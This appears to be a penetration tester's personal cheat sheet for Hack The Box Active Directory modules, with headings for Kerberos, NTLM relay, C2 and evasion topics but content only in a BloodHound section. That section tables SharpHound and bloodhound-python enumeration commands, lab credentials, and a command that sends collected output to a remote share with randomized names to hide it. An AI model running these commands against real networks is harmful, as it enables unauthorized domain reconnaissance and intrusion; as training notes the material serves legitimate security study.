[[#Active Directory Enumeration & Attacks]]
[[#Active Directory LDAP]]
[[#Active Directory PowerView]]
[[#Active Directory BloodHound]]
[[#Windows Lateral Movement]]
[[#Using CrackMapExec]]
[[#Kerberos Attacks]]
[[#DACL Attacks I]]
[[#DACL Attacks II]]
[[#NTLM Relay Attacks]]
[[#ADCS Attacks]]
[[#Active Directory Trust Attacks]]
[[#Intro to C2 Operations with Sliver]]
[[#Introduction to Windows Evasion Techniques]]
[[#MSSQL, Exchange, and SCCM Attacks]]


# Active Directory Enumeration & Attacks
# Active Directory LDAP
# Active Directory PowerView


# Active Directory BloodHound	

| Command                                                                                                                              | Description                                      |
| ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------ |
| `.\SharpHound.exe -c all --zipfilename inlanefreight_bloodhound`                                                                     | Run the SharpHound C# ingestor                   |
| `.\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames`   | Randomize and hide SharpHound Output             |
| `Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound`                                                          | Run the SharpHound PowerShell ingestor           |
| `bloodhound-python -dc <DC> -gc <GC> -d <DOMAIN -c All -u <user>`                                                                    | Run bloodhound-python                            |
| `bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -dc dc01.vintage.htb`                                          |                                                  |
| `bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 -k`                                 |                                                  |
| `bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 --kerberos`                         | Using BloodHound.py with Kerberos authentication |
| `runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe`<br>`net view \\inlanefreight.htb\`<br>`SharpHound.exe -d inlanefreight.htb` | Running from Non-Domain-Joined Systems           |
| `echo -e "\n10.129.204.207 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb" \| sudo tee -a /etc/hosts`                   | #### Setting up the /etc/hosts file              |


# Windows Lateral Movement
# Using CrackMapExec
# Kerberos Attacks
# DACL Attacks I
# DACL Attacks II
# NTLM Relay Attacks
# ADCS Attacks
# Active Directory Trust Attacks
# Intro to C2 Operations with Sliver
# Introduction to Windows Evasion Techniques
# MSSQL, Exchange, and SCCM Attacks

